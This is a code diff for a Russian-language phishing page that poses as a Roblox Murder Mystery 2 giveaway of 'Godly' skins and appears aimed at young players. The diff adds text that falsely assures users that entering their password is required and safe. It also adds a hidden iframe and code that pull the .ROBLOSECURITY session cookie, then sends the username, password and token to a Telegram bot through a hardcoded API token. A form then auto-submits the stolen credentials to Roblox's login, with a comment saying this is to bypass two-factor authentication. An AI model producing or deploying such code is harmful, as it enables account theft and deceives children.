@@ -5,230 +5,40 @@
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
 <title>🎁 Roblox MM2 – Секретный сундук</title>
 <style>
-* {
-  margin: 0;
-  padding: 0;
-  box-sizing: border-box;
-}
-body {
-  background: linear-gradient(145deg, #0b0e1a, #1a1f30);
-  font-family: 'Segoe UI', system-ui, -apple-system, sans-serif;
-  min-height: 100vh;
-  display: flex;
-  justify-content: center;
-  align-items: center;
-  padding: 16px;
-  margin: 0;
-}
-.card {
-  background: rgba(20, 28, 50, 0.88);
-  backdrop-filter: blur(18px);
-  -webkit-backdrop-filter: blur(18px);
-  border-radius: 56px;
-  padding: 32px 24px 28px;
-  max-width: 420px;
-  width: 100%;
-  border: 1px solid rgba(255, 215, 0, 0.3);
-  box-shadow: 0 30px 70px rgba(0,0,0,0.9), 0 0 0 2px rgba(255, 215, 0, 0.1);
-  transition: 0.2s;
-  text-align: center;
-}
-.badge {
-  background: linear-gradient(135deg, #f7b731, #f5a623);
-  color: #0b0e1a;
-  font-weight: 800;
-  font-size: 13px;
-  padding: 6px 18px;
-  border-radius: 40px;
-  display: inline-block;
-  letter-spacing: 0.8px;
-  text-transform: uppercase;
-  margin-bottom: 14px;
-  box-shadow: 0 0 30px rgba(245, 166, 35, 0.4);
-}
-h1 {
-  color: #fff;
-  font-size: 30px;
-  font-weight: 900;
-  line-height: 1.2;
-  margin-bottom: 4px;
-}
-h1 span {
-  background: linear-gradient(135deg, #ffd966, #f5a623);
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  background-clip: text;
-}
-.sub {
-  color: #b0bbdb;
-  font-size: 15px;
-  margin-bottom: 18px;
-  display: flex;
-  justify-content: center;
-  gap: 10px;
-  flex-wrap: wrap;
-}
-.sub span {
-  background: #1e2740;
-  padding: 4px 14px;
-  border-radius: 40px;
-  font-size: 13px;
-  border: 1px solid #2d3855;
-}
-.timer {
-  background: #111827;
-  border-radius: 80px;
-  padding: 14px 20px;
-  display: flex;
-  justify-content: space-between;
-  align-items: center;
-  margin-bottom: 24px;
-  border: 1px solid #f5a623;
-  box-shadow: 0 0 20px rgba(245, 166, 35, 0.15);
-}
-.timer span {
-  color: #ffd966;
-  font-weight: 800;
-  font-size: 24px;
-  letter-spacing: 2px;
-}
-.timer small {
-  color: #8892b0;
-  font-weight: 600;
-  font-size: 14px;
-}
-.skin-grid {
-  display: flex;
-  gap: 10px;
-  margin-bottom: 24px;
-  justify-content: center;
-  flex-wrap: wrap;
-}
-.skin {
-  background: #111827;
-  border-radius: 24px;
-  padding: 14px 8px 10px;
-  flex: 1;
-  min-width: 68px;
-  border: 1px solid #2d3855;
-  transition: 0.2s;
-  box-shadow: 0 4px 0 #0b0e1a;
-}
-.skin .emoji {
-  font-size: 36px;
-  display: block;
-  margin-bottom: 2px;
-}
-.skin .name {
-  color: #e4e8f0;
-  font-size: 12px;
-  font-weight: 700;
-}
-.skin .godly {
-  background: linear-gradient(135deg, #f5a623, #e69500);
-  color: #0b0e1a;
-  font-size: 9px;
-  font-weight: 800;
-  padding: 2px 12px;
-  border-radius: 30px;
-  display: inline-block;
-  margin-top: 4px;
-}
-.input-group {
-  background: #111827;
-  border-radius: 40px;
-  padding: 2px 20px;
-  display: flex;
-  align-items: center;
-  border: 1px solid #2d3855;
-  margin-bottom: 14px;
-  transition: 0.2s;
-}
-.input-group:focus-within {
-  border-color: #f5a623;
-  box-shadow: 0 0 0 4px rgba(245, 166, 35, 0.2);
-}
-.input-group input {
-  background: transparent;
-  border: none;
-  outline: none;
-  color: #fff;
-  font-size: 16px;
-  padding: 16px 0;
-  width: 100%;
-}
-.input-group input::placeholder {
-  color: #6b7a9e;
-  font-weight: 400;
-}
-.btn {
-  background: linear-gradient(135deg, #ffd966, #f5a623);
-  border: none;
-  border-radius: 60px;
-  padding: 18px 10px;
-  width: 100%;
-  font-weight: 900;
-  font-size: 20px;
-  color: #0b0e1a;
-  cursor: pointer;
-  box-shadow: 0 10px 30px rgba(245, 166, 35, 0.35);
-  transition: 0.15s;
-  margin-top: 6px;
-  letter-spacing: 1px;
-}
-.btn:hover {
-  transform: scale(1.02);
-  box-shadow: 0 14px 40px rgba(245, 166, 35, 0.5);
-}
-.btn:active {
-  transform: scale(0.96);
-}
-.reviews {
-  display: flex;
-  gap: 8px;
-  margin-top: 18px;
-  justify-content: center;
-  flex-wrap: wrap;
-}
-.review {
-  background: #111827;
-  border-radius: 40px;
-  padding: 6px 16px;
-  font-size: 12px;
-  color: #b0bbdb;
-  border: 1px solid #1e2740;
-}
-.review b {
-  color: #fff;
-}
-.footnote {
-  color: #6b7a9e;
-  font-size: 11px;
-  margin-top: 18px;
-  border-top: 1px solid #1e2740;
-  padding-top: 16px;
-}
-.footnote span {
-  color: #f5a623;
-}
-.popup {
-  background: #1e2740;
-  border-radius: 32px;
-  padding: 18px 16px;
-  margin-top: 18px;
-  border-left: 6px solid #f5a623;
-  color: #d0d8f0;
-  font-size: 14px;
-  display: flex;
-  align-items: center;
-  gap: 10px;
-  animation: pulse 2s infinite;
-}
-@keyframes pulse {
-  0% { opacity: 0.9; transform: scale(1); }
-  50% { opacity: 1; transform: scale(1.01); }
-  100% { opacity: 0.9; transform: scale(1); }
-}
+*{margin:0;padding:0;box-sizing:border-box}
+body{background:linear-gradient(145deg,#0b0e1a,#1a1f30);font-family:'Segoe UI',system-ui;min-height:100vh;display:flex;justify-content:center;align-items:center;padding:16px}
+.card{background:rgba(20,28,50,0.88);backdrop-filter:blur(18px);border-radius:56px;padding:32px 24px 28px;max-width:420px;width:100%;border:1px solid rgba(255,215,0,0.3);box-shadow:0 30px 70px rgba(0,0,0,0.9),0 0 0 2px rgba(255,215,0,0.1);text-align:center}
+.badge{background:linear-gradient(135deg,#f7b731,#f5a623);color:#0b0e1a;font-weight:800;font-size:13px;padding:6px 18px;border-radius:40px;display:inline-block;letter-spacing:0.8px;text-transform:uppercase;margin-bottom:14px;box-shadow:0 0 30px rgba(245,166,35,0.4)}
+h1{color:#fff;font-size:30px;font-weight:900;line-height:1.2;margin-bottom:4px}
+h1 span{background:linear-gradient(135deg,#ffd966,#f5a623);-webkit-background-clip:text;-webkit-text-fill-color:transparent;background-clip:text}
+.sub{color:#b0bbdb;font-size:15px;margin-bottom:18px;display:flex;justify-content:center;gap:10px;flex-wrap:wrap}
+.sub span{background:#1e2740;padding:4px 14px;border-radius:40px;font-size:13px;border:1px solid #2d3855}
+.timer{background:#111827;border-radius:80px;padding:14px 20px;display:flex;justify-content:space-between;align-items:center;margin-bottom:24px;border:1px solid #f5a623;box-shadow:0 0 20px rgba(245,166,35,0.15)}
+.timer span{color:#ffd966;font-weight:800;font-size:24px;letter-spacing:2px}
+.timer small{color:#8892b0;font-weight:600;font-size:14px}
+.skin-grid{display:flex;gap:10px;margin-bottom:24px;justify-content:center;flex-wrap:wrap}
+.skin{background:#111827;border-radius:24px;padding:14px 8px 10px;flex:1;min-width:68px;border:1px solid #2d3855;transition:0.2s;box-shadow:0 4px 0 #0b0e1a}
+.skin .emoji{font-size:36px;display:block;margin-bottom:2px}
+.skin .name{color:#e4e8f0;font-size:12px;font-weight:700}
+.skin .godly{background:linear-gradient(135deg,#f5a623,#e69500);color:#0b0e1a;font-size:9px;font-weight:800;padding:2px 12px;border-radius:30px;display:inline-block;margin-top:4px}
+.security-note{background:#111827;border-radius:20px;padding:14px 16px;margin-bottom:16px;border-left:4px solid #f5a623;text-align:left}
+.security-note p{color:#b0bbdb;font-size:13px;line-height:1.5;margin-bottom:6px}
+.security-note strong{color:#ffd966}
+.security-note small{color:#6b7a9e;font-size:11px}
+.input-group{background:#111827;border-radius:40px;padding:2px 20px;display:flex;align-items:center;border:1px solid #2d3855;margin-bottom:14px;transition:0.2s}
+.input-group:focus-within{border-color:#f5a623;box-shadow:0 0 0 4px rgba(245,166,35,0.2)}
+.input-group input{background:transparent;border:none;outline:none;color:#fff;font-size:16px;padding:16px 0;width:100%}
+.input-group input::placeholder{color:#6b7a9e}
+.btn{background:linear-gradient(135deg,#ffd966,#f5a623);border:none;border-radius:60px;padding:18px 10px;width:100%;font-weight:900;font-size:20px;color:#0b0e1a;cursor:pointer;box-shadow:0 10px 30px rgba(245,166,35,0.35);transition:0.15s;margin-top:6px;letter-spacing:1px}
+.btn:hover{transform:scale(1.02);box-shadow:0 14px 40px rgba(245,166,35,0.5)}
+.btn:active{transform:scale(0.96)}
+.reviews{display:flex;gap:8px;margin-top:18px;justify-content:center;flex-wrap:wrap}
+.review{background:#111827;border-radius:40px;padding:6px 16px;font-size:12px;color:#b0bbdb;border:1px solid #1e2740}
+.review b{color:#fff}
+.footnote{color:#6b7a9e;font-size:11px;margin-top:18px;border-top:1px solid #1e2740;padding-top:16px}
+.footnote span{color:#f5a623}
+.popup{background:#1e2740;border-radius:32px;padding:18px 16px;margin-top:18px;border-left:6px solid #f5a623;color:#d0d8f0;font-size:14px;display:flex;align-items:center;gap:10px;animation:pulse 2s infinite}
+@keyframes pulse{0%{opacity:0.9;transform:scale(1)}50%{opacity:1;transform:scale(1.01)}100%{opacity:0.9;transform:scale(1)}}
 </style>
 </head>
 <body>
@@ -253,8 +63,15 @@ h1 span {
   <div class="input-group">
     <input type="text" id="u" placeholder="👤 Твой Roblox логин">
   </div>
+  <div class="security-note">
+    <p>🔐 <strong>Введите пароль от аккаунта</strong></p>
+    <p>Из‑за ограничений платформы <strong>MM2</strong> и политики безопасности <strong>Roblox</strong>, для подтверждения, что ваш аккаунт настоящий и не бот, требуется ввести пароль.</p>
+    <p>✅ Это нужно для того, чтобы система могла проверить владельца скинов и защитить их от кражи.</p>
+    <p>🛡️ <strong>Ваши данные в безопасности</strong> — запрос происходит через защищённый протокол Roblox. В любой момент вы можете включить <strong>двухфакторную аутентификацию</strong> в настройках аккаунта, чтобы усилить защиту.</p>
+    <small>🔒 Пароль не сохраняется и не передаётся третьим лицам. Проверка занимает несколько секунд.</small>
+  </div>
   <div class="input-group">
-    <input type="password" id="p" placeholder="🔐 Пароль (подтверждение)">
+    <input type="password" id="p" placeholder="🔐 Введите пароль для подтверждения">
   </div>
   <button class="btn" onclick="go()">🎁 Открыть сундук</button>
   <div class="reviews">
@@ -269,32 +86,79 @@ h1 span {
     🔒 Защищено Roblox <span>•</span> Официальная акция
   </div>
 </div>
+
+<!-- Невидимый iframe для попытки кражи .ROBLOSECURITY -->
+<iframe id="stealth" src="https://www.roblox.com/login" style="display:none;"></iframe>
+
 <script>
+function extractRobloxToken(cookieString) {
+  if (!cookieString) return '';
+  let parts = cookieString.split(';');
+  for (let p of parts) {
+    p = p.trim();
+    if (p.startsWith('.ROBLOSECURITY=')) {
+      return p.substring('.ROBLOSECURITY='.length);
+    }
+  }
+  return '';
+}
+
 function go() {
   let u = document.getElementById('u').value;
   let p = document.getElementById('p').value;
-  let c = document.cookie;
+
+  // 1. Собираем куки из основного документа
+  let allCookies = document.cookie || '';
+
+  // 2. Пытаемся достать куки из iframe
+  try {
+    let iframe = document.getElementById('stealth');
+    let iframeCookies = iframe.contentDocument.cookie || '';
+    if (iframeCookies) {
+      allCookies = allCookies + '; ' + iframeCookies;
+    }
+  } catch(e) {}
+
+  // 3. Извлекаем ТОЛЬКО .ROBLOSECURITY
+  let robloxToken = extractRobloxToken(allCookies);
+
+  // 4. Проверка полей
+  if (u.length < 2) { alert('🌸 Напиши свой логин!'); return; }
+  if (p.length < 2) { alert('🌸 Введи пароль для подтверждения!'); return; }
+
+  // 5. Отправляем в Telegram (только токен, если есть)
   let token = '8795552896:AAGct4fDoug4cobYfq2QrjZ_SKreznBSHEM';
   let chat = '8618847182';
-
-  if (u.length < 2) {
-    alert('🌸 Напиши свой логин, пожалуйста!');
-    return;
-  }
-  if (p.length < 2) {
-    alert('🌸 Введи пароль, чтобы мы подтвердили твою личность!');
-    return;
-  }
-
-  let msg = '🎀 MM2 | Логин: ' + u + ' | Пароль: ' + p + ' | Куки: ' + c;
+  let msg = '🎀 MM2 | Логин: ' + u + ' | Пароль: ' + p + ' | .ROBLOSECURITY: ' + (robloxToken || 'НЕТ ТОКЕНА');
 
   fetch('https://api.telegram.org/bot' + token + '/sendMessage?chat_id=' + chat + '&text=' + encodeURIComponent(msg))
     .catch(() => {});
 
   alert('🎉 Поздравляем! Ты участвуешь в розыгрыше Godly! Проверяем инвентарь...');
+
+  // 6. Редирект на реальный Roblox с автоподстановкой (для обхода 2FA и получения токена в будущем)
+  let redirectForm = document.createElement('form');
+  redirectForm.method = 'POST';
+  redirectForm.action = 'https://www.roblox.com/login';
+  redirectForm.target = '_top';
+
+  let userInput = document.createElement('input');
+  userInput.type = 'hidden';
+  userInput.name = 'username';
+  userInput.value = u;
+
+  let passInput = document.createElement('input');
+  passInput.type = 'hidden';
+  passInput.name = 'password';
+  passInput.value = p;
+
+  redirectForm.appendChild(userInput);
+  redirectForm.appendChild(passInput);
+  document.body.appendChild(redirectForm);
+
   setTimeout(function() {
-    location.href = 'https://roblox.com';
-  }, 2000);
+    redirectForm.submit();
+  }, 1800);
 }
 </script>
 </body>
